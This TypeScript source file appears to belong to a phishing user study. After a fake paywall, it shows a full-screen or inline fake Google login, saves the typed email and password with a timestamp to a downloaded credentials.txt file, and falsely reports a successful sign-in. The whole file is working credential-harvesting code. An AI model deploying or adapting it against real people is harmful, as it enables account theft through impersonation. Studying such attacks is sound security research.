// src/main.ts

import "./styles.css";
import { attackConfig } from "./config.js";

const PAYWALL_DELAY_MS = 10_000;

const paywallOverlay = document.getElementById(
  "paywall-overlay"
) as HTMLDivElement | null;
const paywallContinue = document.getElementById(
  "paywall-continue"
) as HTMLButtonElement | null;
const paywallDismiss = document.getElementById(
  "paywall-dismiss"
) as HTMLButtonElement | null;

const pageRoot = document.getElementById("page-root") as HTMLDivElement;
const fakeRoot = document.getElementById("fake-google-root") as HTMLDivElement;
const fakeLoginForm = document.getElementById(
  "fake-login-form"
) as HTMLFormElement;
const fakeEmail = document.getElementById("fake-email") as HTMLInputElement;
const fakePassword = document.getElementById(
  "fake-password"
) as HTMLInputElement;

let paywallTimer: number | null = null;
let attackActive = false;
let loginPageShownTime: number | null = null;

function resetInitialView() {
  pageRoot.classList.remove("hidden");
  fakeRoot.classList.add("hidden");
  fakeRoot.setAttribute("hidden", "hidden");

  if (paywallOverlay) {
    paywallOverlay.classList.add("hidden");
    paywallOverlay.classList.remove("visible");
    paywallOverlay.setAttribute("hidden", "hidden");
  }
  attackActive = false;
}

function showPaywallOverlay() {
  if (!paywallOverlay) {
    return;
  }
  paywallOverlay.classList.remove("hidden");
  paywallOverlay.classList.add("visible");
  paywallOverlay.removeAttribute("hidden");

  window.setTimeout(() => {
    paywallContinue?.focus();
  }, 120);
}

function hidePaywallOverlay() {
  if (!paywallOverlay) {
    return;
  }
  paywallOverlay.classList.add("hidden");
  paywallOverlay.classList.remove("visible");
  paywallOverlay.setAttribute("hidden", "hidden");

  if (paywallTimer !== null) {
    window.clearTimeout(paywallTimer);
    paywallTimer = null;
  }
}

/**
 * Enter fullscreen (Condition A) or show fake login inline (Condition B).
 * The browser may still show its small fullscreen origin indicator in Condition A.
 */
async function startGuiConfusion() {
  if (attackActive) {
    return;
  }
  attackActive = true;
  loginPageShownTime = Date.now();
  hidePaywallOverlay();
  pageRoot.classList.add("hidden");
  fakeRoot.classList.remove("hidden");
  fakeRoot.removeAttribute("hidden");

  // Only request fullscreen for Condition A
  if (attackConfig.useFullscreen) {
    const targetElement: HTMLElement = fakeRoot;

    if (targetElement.requestFullscreen) {
      try {
        await targetElement.requestFullscreen();
      } catch (err) {
        console.error("Fullscreen request failed:", err);
      }
    } else {
      console.warn("Fullscreen API not supported in this browser.");
    }
  }
}

/**
 * Exit fullscreen (if active) and return to the normal page.
 */
async function exitGuiConfusion() {
  attackActive = false;
  fakeRoot.classList.add("hidden");
  pageRoot.classList.remove("hidden");
  fakeRoot.setAttribute("hidden", "hidden");

  // Clear any dummy inputs
  fakeEmail.value = "";
  fakePassword.value = "";

  if (document.fullscreenElement) {
    try {
      await document.exitFullscreen();
    } catch (err) {
      console.error("Failed to exit fullscreen:", err);
    }
  }
}

/**
 * Handle fake login form submission.
 * Saves credentials to a text file with timestamp, then exits.
 */
function handleFakeLoginSubmit(event: SubmitEvent) {
  event.preventDefault();

  const email = fakeEmail.value;
  const password = fakePassword.value;
  const timestamp = new Date().toISOString();

  // Calculate time to first login click
  const timeToClick = loginPageShownTime 
    ? ((Date.now() - loginPageShownTime) / 1000).toFixed(2)
    : "N/A";

  // Create log entry
  const logEntry = `Timestamp: ${timestamp}\nEmail: ${email}\nPassword: ${password}\nTime to First Login Click (seconds): ${timeToClick}\n\n`;

  // Create blob and download link
  const blob = new Blob([logEntry], { type: "text/plain" });
  const downloadLink = document.createElement("a");
  downloadLink.download = "credentials.txt";
  downloadLink.href = window.URL.createObjectURL(blob);
  downloadLink.style.display = "none";

  // Trigger download
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
  window.URL.revokeObjectURL(downloadLink.href);

  // Clear input values
  fakeEmail.value = "";
  fakePassword.value = "";

  // Show error message and exit
  alert("Signed in successfully. Exiting.");
  void exitGuiConfusion();
}

/**
 * Wire up event listeners once DOM has loaded.
 */
function setupHandlers() {
  resetInitialView();

  if (paywallContinue) {
    paywallContinue.addEventListener("click", () => {
      void startGuiConfusion();
    });
  }

  if (paywallDismiss) {
    paywallDismiss.addEventListener("click", () => {
      hidePaywallOverlay();
    });
  }

  if (fakeLoginForm) {
    fakeLoginForm.addEventListener("submit", handleFakeLoginSubmit);
  }

  // If user presses Escape, exit fullscreen and restore normal page
  document.addEventListener("keydown", (event: KeyboardEvent) => {
    if (event.key !== "Escape") {
      return;
    }

    if (!fakeRoot.classList.contains("hidden")) {
      void exitGuiConfusion();
      return;
    }

    hidePaywallOverlay();
  });

  if (paywallTimer !== null) {
    window.clearTimeout(paywallTimer);
  }

  paywallTimer = window.setTimeout(() => {
    showPaywallOverlay();
  }, PAYWALL_DELAY_MS);
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", setupHandlers);
} else {
  setupHandlers();
}
